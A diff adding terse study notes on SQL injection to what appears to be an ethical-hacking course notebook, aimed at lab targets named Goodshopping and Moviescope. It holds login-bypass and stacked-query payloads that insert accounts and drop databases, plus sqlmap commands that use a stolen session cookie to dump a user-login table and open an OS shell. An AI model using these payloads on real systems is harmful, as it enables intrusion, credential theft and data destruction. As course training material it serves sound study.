@@ -759,7 +759,23 @@ Module 14 - Web Application
 
 Module 15 - SQL Injection 
 -------------------------
-
+	TCP port 1433			Target: Goodshopping
+	Login without valid credential (USERNAME: blah' or 1=1 -- password; empty)
+	create a account sql injection (USERNAME: blah';insert into login value ('john','apple123'); --  PASSWORD:empty) display must no mistake
+	create database USERNAME: blah';create database Mydatabase; --  PASSWORD:empty
+	delete database USERNAME: blah';drop database Mydatabase; --  PASSWORD:empty
+	
+	Extract database sqlmap 
+				Target: Moviescope 				pag 1447
+				login in webpage and inspect right-click
+	obtain session cookie (console type: document.cookie enter copy resulted cookie
+	enum_database, OS, web_App, web_SVR (root: sqlmap -u "http://moviescope.com/viewprofile.aspx?id=1"-- cookie= "result_cookie"--dbs ) then 2 times Yes
+	enum_tables (root: sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables ) then yes
+	enum_user_account (root: sqlmap -u "http://moviescope.com/viewprofile.aspx?id=1"-- cookie= "result_cookie"-D moviescope -T User_Login --Dump
+	enum_OS	(root: sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell ) then hostname or tasklist, help to see others commands
+	
+	Detect sql owasp zap
+		Steps: quick_scan --> Automated_scan--> URl --> attack --> open aba Alerts --> se
 
 
 Module 16 - Hacking Wireless Network 
